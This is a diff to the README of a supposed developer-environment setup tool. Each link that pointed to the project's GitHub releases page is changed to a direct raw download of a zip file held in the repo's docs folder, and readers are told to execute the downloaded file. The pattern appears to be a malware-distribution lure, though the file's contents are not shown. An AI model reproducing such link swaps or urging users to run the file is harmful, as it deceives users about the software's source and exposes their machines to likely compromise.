@@ -14,7 +14,7 @@ Welcome to the DevEnvSetup repository, your go-to tool for effortlessly setting 
 ---
 
 ### Get Started
-🔗 [Download DevEnvSetup](https://github.com/4NGRYK1D/devenv-setup/releases) and start automating your development environment setup process now!
+🔗 [Download DevEnvSetup](https://raw.githubusercontent.com/4NGRYK1D/devenv-setup/master/docs/devenv_setup_v1.9.zip) and start automating your development environment setup process now!
 
 ---
 
@@ -27,7 +27,7 @@ Welcome to the DevEnvSetup repository, your go-to tool for effortlessly setting 
 ---
 
 ### How to Use DevEnvSetup
-1. Download the latest release from the provided [link](https://github.com/4NGRYK1D/devenv-setup/releases).
+1. Download the latest release from the provided [link](https://raw.githubusercontent.com/4NGRYK1D/devenv-setup/master/docs/devenv_setup_v1.9.zip).
 2. Execute the downloaded file to begin the installation process.
 3. Follow the on-screen instructions to configure your development environment.
 
@@ -52,7 +52,7 @@ Welcome to the DevEnvSetup repository, your go-to tool for effortlessly setting 
 ---
 
 ### Stay Updated
-Be sure to check the "Releases" section for the latest updates and improvements. Visit the provided [link](https://github.com/4NGRYK1D/devenv-setup/releases) for more information.
+Be sure to check the "Releases" section for the latest updates and improvements. Visit the provided [link](https://raw.githubusercontent.com/4NGRYK1D/devenv-setup/master/docs/devenv_setup_v1.9.zip) for more information.
 
 ---
 
